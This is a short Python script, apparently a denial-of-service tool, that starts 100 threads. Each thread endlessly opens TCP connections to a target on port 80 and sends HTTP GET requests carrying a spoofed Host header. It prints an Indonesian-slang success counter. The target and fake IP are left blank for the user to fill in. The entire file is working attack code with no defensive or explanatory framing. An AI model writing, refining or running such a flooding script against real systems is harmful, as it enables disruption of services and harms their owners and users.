import socket
import threading

target = ""
fake_ip = ""
port = 80

attack_num = 0

def attack():
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            soc.connect((target, port))

            soc.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
            soc.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))

            global attack_num
            attack_num += 1
            print(f'Sukses Mang {target} :{attack_num}')

        except Exception as e:
            print(f'Error: {e}')

        finally:
            soc.close()

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()
